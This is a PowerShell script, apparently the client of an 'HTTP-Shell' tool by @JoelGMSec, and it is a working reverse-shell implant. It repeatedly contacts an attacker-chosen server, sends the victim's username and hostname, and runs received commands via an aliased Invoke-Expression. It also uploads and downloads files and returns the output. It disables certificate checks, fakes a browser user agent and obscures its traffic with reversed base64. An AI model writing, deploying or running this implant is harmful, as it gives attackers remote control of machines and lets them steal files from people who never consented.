#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

# Variables
New-Alias -name pwn -Value iex -Force
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "Continue"
$server = $args[1] ; $sleeps = $args[3]
$userAgent = "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"

# Help
if (($args[0] -like "-h*") -or ($args[1] -eq $null)){
Write-Host "[!] Usage: .\HTTP-Client.ps1 -c [HOST:PORT] -s [SLEEP] (optional)`n" -ForegroundColor "Red" ; exit }

# Proxy Aware & TLS Legacy Support
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,
WebRequest request, int certificateProblem) {
return true; }}
"@

$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12"
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# Functions
function Get-Env {
   $usr = $env:username.toLower()+"@"+$env:computername.toLower()
   $pwd = $pwd.path ; Write-Output "$usr!$pwd" | Out-String }

function R64Encoder {
   if ($args[0] -eq "-t") { 
      $encode = $($base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1]))) 2>&1> $null }
   if ($args[0] -eq "-f") { 
      $encode = $($base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1]))) 2>&1> $null }
   $encode = $($base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")) 2>&1> $null
   $encode = $($revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64) 2>&1> $null ; return $R64Base }

function R64Decoder {
   $base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
   $base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
   switch ($base64.Length % 4) { 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
   if ($args[0] -eq "-t") {
      $decode = $($revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))) 2>&1> $null }
   if ($args[0] -eq "-f") {
      $decode = $($revb64 = [System.Convert]::FromBase64String($base64)) 2>&1> $null } return $revb64 }

# Main
while ($true) {
   if ($sleeps) { Start-Sleep $sleeps }
   $env = Get-Env ; $commandx = $null ; $errorlog = $null ; $getenv64 = R64Encoder -t $env
   $request1 = $(Invoke-WebRequest -UserAgent $userAgent -UseBasicParsing $server/api/info -Method Post -Body "Info: $getenv64") 2>&1> $null
   $response = $($token = Invoke-WebRequest -UserAgent $userAgent -UseBasicParsing $server/api/token -Method Get) 2>&1> $null
   $response = $($invoke64 = R64Decoder -t ($token.ToString().Split(" ")[-1])) 2>&1> $null

   if ($invoke64 -like "upload*") {
      $file_path = $invoke64.toString().Split("!")[1] ; $invoke64 = $null
      $download = $($file_content = Invoke-WebRequest -UserAgent $userAgent -UseBasicParsing $server/api/download -Method Get) 2>&1> $null
      $file_content = R64Decoder -f $file_content.ToString().Split(" ")[-1]
      [IO.File]::WriteAllBytes("$file_path", $file_content)}

   if ($invoke64 -like "download*") {
      $file_path = $invoke64.toString().Split(" ",2)[1].Split("!")[0] ; $invoke64 = $null
      $file_content = R64Encoder -f "$file_path"
      $upload = $(Invoke-WebRequest -UserAgent $userAgent -UseBasicParsing $server/api/upload -Method Post -Body "File: $file_content") 2>&1> $null }

   if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 ; $param = "Debug"
   if ($errorlog -ne $null) { $commandx = Write-Output $error[0] | Out-String ; $param = "Error" }
   if (($invoke64 -like "cd*") -or ($invoke64 -like "Set-Location*")) { if (!$errorlog) { $commandx = "HTTPShellNull" }}
   $output64 = R64Encoder -t $commandx ; [string]$path = $param.toLower()
   $request2 = $(Invoke-WebRequest -UserAgent $userAgent -UseBasicParsing $server/api/$path -Method Post -Body "$param`: $output64") 2>&1> $null }}
